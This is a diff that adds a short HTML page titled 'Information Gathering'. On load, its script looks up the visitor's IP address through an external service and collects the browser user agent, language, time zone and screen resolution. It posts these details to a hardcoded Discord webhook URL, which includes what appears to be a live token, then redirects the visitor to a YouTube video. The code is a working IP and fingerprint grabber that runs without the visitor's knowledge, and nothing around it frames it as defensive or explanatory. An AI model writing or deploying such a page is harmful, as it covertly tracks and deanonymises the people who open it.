@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Information Gathering</title>
+<script>
+  window.onload = function() {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const screenResolution = window.screen.width + "x" + window.screen.height;
+
+        const payload = {
+          embeds: [{
+            title: "User Information",
+            fields: [
+              { name: "IP Address", value: ip },
+              { name: "User Agent", value: userAgent },
+              { name: "Language", value: language },
+              { name: "Time Zone", value: timeZone },
+              { name: "Screen Resolution", value: screenResolution }
+            ]
+          }]
+        };
+
+        fetch('https://discord.com/api/webhooks/1352089176924885074/YroQXBPrVVHVSwC8xO6rM9hsq7uxjURZdcpzK9FXLzJGYdQTo2ThGPNwocreRFqMWqYS', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+      });
+
+    setTimeout(function() {
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    }, 1000);
+  };
+</script>
+</head>
+<body>
+  <h1>Gathering Information...</h1>
+</body>
+</html>
